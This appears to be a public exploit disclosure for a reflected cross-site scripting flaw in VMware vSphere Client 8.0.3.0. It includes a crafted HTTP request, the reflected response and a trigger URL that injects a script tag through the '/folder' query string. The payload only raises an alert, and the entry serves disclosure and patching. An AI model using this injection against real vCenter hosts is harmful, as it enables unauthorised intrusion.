# Exploit Title: VMware vSphere Client 8.0.3.0 - Reflected Cross-Site Scripting (XSS)
# Date: 2025-08-08
# Exploit Author: Imraan Khan (Lich-Sec)
# Vendor Homepage: https://www.vmware.com
# Software Link: Licensed software (available via VMware portal)
# Version: vSphere Client 8.0.3.0
# Tested on: Web interface (Chrome 138)
# CVE: CVE-2025-41228
# CWE: CWE-79 - Improper Neutralization of Input During Web Page Generation (XSS)

# Description:
# A reflected Cross-Site Scripting (XSS) vulnerability exists in VMware vSphere Client 8.0.3.0.
# The application fails to sanitize input passed via a query string to the `/folder` endpoint,
# resulting in arbitrary JavaScript execution when the reflected value is rendered into the HTML
# formâ€™s `action` attribute.

# Steps to Reproduce:

# 1. Visit the following URL in a browser:
#    https://host/folder?ht7j4

# 2. Intercept the request in Burp Suite and modify the query string to:
GET /folder?ht7j4"><script>alert('ThisIsAnXSSBug')</script>tnkav=1 HTTP/2
Host: 192.168.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Referer: https://192.168.x.x/
Accept: text/html,application/xhtml+xml

# 3. Observe the payload reflected in the HTTP response:
<form action="/folder?ht7j4"><script>alert('ThisIsAnXSSBug')</script>tnkav=1" method="POST">
  <input name="VMware-CSRF-Token" type="hidden" value="..." />

# 4. Use Burp's "Open in Browser" feature (with cookies) or a browser with an active session
#    to view the response. The injected script will execute.

# Example URL to trigger XSS:
https://192.168.x.x/folder?ht7j4"><script>alert(1)</script>tnkav=1

# Notes:
# - Vulnerable in versions prior to VMware vCenter 8.0 U3e.

# Disclosure Timeline:
# - Discovered: 2025-08-07
# - CVE Assigned: 2025-08-08
# - Public Disclosure: 2025-08-08

# References:
# - https://github.com/stSLAYER/Lich-Sec/tree/main/CVE/CVE-2025-41228
# - https://nvd.nist.gov/vuln/detail/CVE-2025-41228
# - https://www.vmware.com/security/advisories
